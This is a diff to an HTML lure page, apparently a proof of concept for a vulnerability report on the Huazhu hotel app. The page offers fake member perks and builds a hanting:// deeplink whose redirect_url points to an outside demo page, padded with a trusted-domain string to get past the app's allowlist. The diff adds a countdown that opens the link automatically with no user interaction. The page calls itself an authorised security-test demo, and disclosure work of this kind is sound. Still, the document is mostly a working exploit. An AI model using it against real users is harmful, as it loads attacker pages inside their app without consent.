@@ -20,6 +20,7 @@ a.btn{display:inline-block;background:#fff;color:#c8102e;font-weight:700;font-si
 <div class="benefits"><span class="b">🏨 住宿券包</span><span class="b">✨ 积分翻倍</span><span class="b">⏰ 延迟退房</span><span class="b">☕ 双早权益</span></div>
 <!-- 攻击入口: 普通浏览器 a 标签即可拉起华住 App 的 deeplink, 无需任何权限 -->
 <a class="btn" id="go" href="#">立即领取</a>
+<div id="cd" style="font-size:14px;margin-top:16px;opacity:.95">5 秒后自动领取…</div>
 <div class="small">授权安全测试演示页(SRC)<br>点击后华住App将被拉起并自动完成"会员验证"<br>全程零交互 · 无需输入任何信息</div>
 <script>
 // 展示页地址: 同仓库部署时自动推导, 也可在此硬编码覆盖
@@ -28,7 +29,17 @@ if (location.hostname !== 'derham1999.github.io') {
   // 非线上环境(本地/其他静态托管)自动切换为同源推导
   DEMO = location.origin + location.pathname.replace('welfare-entry.html', '') + 'member-center.html';
 }
-document.getElementById('go').href =
-  'hanting://h5?redirect_url=' + encodeURIComponent(DEMO + '?v=1&://hmall.huazhu.com/');
+var DL = 'hanting://h5?redirect_url=' + encodeURIComponent(DEMO + '?v=1&://hmall.huazhu.com/');
+document.getElementById('go').href = DL;
+// 延迟自动跳转(演示"零交互"场景)
+var sec = 5;
+var cd = document.getElementById('cd');
+var timer = setInterval(function(){
+  sec--;
+  if (sec > 0) { cd.textContent = sec + ' 秒后自动领取…'; return; }
+  clearInterval(timer);
+  cd.textContent = '正在打开华住App…';
+  location.href = DL;
+}, 1000);
 </script>
 </body></html>
